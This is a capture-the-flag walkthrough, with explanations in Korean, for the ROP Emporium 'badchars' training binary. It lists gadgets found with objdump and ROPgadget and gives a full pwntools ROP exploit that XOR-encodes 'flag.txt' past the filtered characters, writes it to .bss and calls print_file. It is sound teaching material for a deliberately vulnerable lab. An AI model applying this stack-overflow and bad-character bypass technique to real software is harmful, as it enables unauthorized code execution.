# [badchars](https://ropemporium.com/challenge/badchars.html)
<br />

**Description:**
> An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack.
Find a way to deal with this and craft your exploit.

<br />

**Binary Protections:**
```yaml
badchars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6c79e265b17cf6845beca7e17d6d8ac2ecb27556, not stripped

[*] '/home/kali/pico/badchars'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

> [!WARNING]
> ```text
> badchars are: 'x', 'g', 'a', '.'
> ```
> 문제에서는 특정 문자의 사용을 금지하고 있으며, `flag.txt`의 일부 문자열을 사용하지 못합니다.

<br />

해당 문제는 `xor`연산을 두 번 진행하면 원래 값으로 돌아오는 특성을 이용하여 규칙을 우회할 수 있습니다.

<br />

```yaml
$ objdump -d badchars
Disassembly of section .text:

0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       bf c4 06 40 00          mov    $0x4006c4,%edi
  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
  400625:       90                      nop
  400626:       5d                      pop    %rbp
  400627:       c3                      ret

0000000000400628 <usefulGadgets>:
  400628:       45 30 37                xor    %r14b,(%r15)
  40062b:       c3                      ret
  40062c:       45 00 37                add    %r14b,(%r15)
  40062f:       c3                      ret
  400630:       45 28 37                sub    %r14b,(%r15)
  400633:       c3                      ret
  400634:       4d 89 65 00             mov    %r12,0x0(%r13)
  400638:       c3                      ret
  400639:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
```
- `print_file@plt = 0x400510`
- `xor r15; r14 ; ret = 0x400628`
- `mov [r13] ; r12 ; ret = 0x400634`

```yaml
$ ROPgadget --binary badchars | grep "pop rdi"
0x00000000004006a3 : pop rdi ; ret
```
```yaml
$ ROPgadget --binary badchars | grep "pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```
```yaml
$ ROPgadget --binary badchars | grep "pop r14 ; pop r15 ; ret"
0x00000000004006a0 : pop r14 ; pop r15 ; ret
```
위 과정을 통해 필요한 가젯을 구할 수 있습니다. 이제 아래 순서를 참고하여 가젯들로 `rop`를 진행합니다.

<br />

> [!NOTE]
> 1. 규칙을 우회하기 위해 `"flag.txt"`를 `xor` 합니다. 
> 2. 연산된 값은 레지스터를 통해 `bss` 영역에 저장됩니다. (규칙 우회)
> 3. 저장된 값은 다시 `xor` 연산을 통해 문자열을 복원합니다. (`bss` 영역에는 `"flag.txt"`가 저장되어 있습니다.)
> 4. `"flag.txt"`를 `print_file`의 인자로 넘겨 호출합니다.

<br />
<br />

```python
from pwn import *

def xor(data):
    res = b""
    for ch in data:
        res += ((ch) ^ 2).to_bytes(1, "little")
    return res

context.log_level = "error"

p = process("./badchars")

# gadget
pop_rdi = 0x4006a3
xor_r15_r14 = 0x400628
pop_r14_r15 = 0x4006a0
mov_r13_r12 = 0x400634
pop_r12_r13_r14_r15 = 0x40069c

print_file = 0x400510
bss = 0x601038

flag = xor(b"flag.txt")
print("flag: ", flag)

payload = b'A' * 40

payload += p64(pop_r12_r13_r14_r15)
payload += flag + p64(bss) + p64(0) + p64(0)
payload += p64(mov_r13_r12) # [bss] = "dnce,vzv"

for i in range(8):
    payload += p64(pop_r14_r15)
    payload += p64(2) + p64(bss + i)
    payload += p64(xor_r15_r14) # [bss] = "flag.txt" 

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(print_file)

p.sendline(payload)
p.interactive()
```
```yaml
$ python3 test.py
b'flag: ' b'dnce,vzv'
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```
